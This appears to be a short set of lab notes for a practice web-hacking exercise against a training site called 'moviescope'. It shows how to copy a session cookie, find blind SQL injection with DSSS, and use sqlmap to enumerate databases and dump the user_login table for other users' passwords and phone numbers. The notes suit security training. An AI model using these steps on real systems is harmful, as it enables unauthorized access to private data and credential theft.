@@ -1,0 +1,20 @@
+goto www.moviescope.com with user sam/test and go to profile
+Right click on web site -> inspect -> console
+type document.cookie and copy the cookie
+
+parrot os :: terminal :: sudo su :: cd DSSS
+python3 dsss.py --cookie="" -u "www.moviescope.com/id-1"
+
+Find vulnerability with blind SQL and example URL as output
+Copy and paste the URL in the browser to open all users profiles 
+Find ketty phone number from ketty profile
+
+
+parrot os :: terminal :: sudo su  :: cd 
+Firefox browser: goto www.moviescope.com with user sam/test and go to profile
+Right click on web site -> inspect -> console
+type document.cookie and copy the cookie
+In Terminal: sqlmap -u "URL of website" --cookie "copied cookie" --dbs
+sqlmap -u "URL of website" --cookie "copied cookie" -D moviescope --tables
+sqlmap -u "URL of website" --cookie "copied cookie" -D moviescope -T user_login --dump
+find password for the user 
